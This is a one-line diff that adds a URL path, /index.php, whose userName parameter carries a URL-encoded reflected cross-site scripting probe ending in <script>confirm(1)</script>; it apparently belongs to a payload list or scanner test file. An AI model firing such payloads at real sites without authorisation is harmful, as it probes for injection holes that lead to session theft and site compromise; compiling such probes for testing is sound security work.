@@ -1,0 +1,1 @@
+/index.php?userName=%22%3E%3Cscript%3Econfirm(1)%3C/script%3E
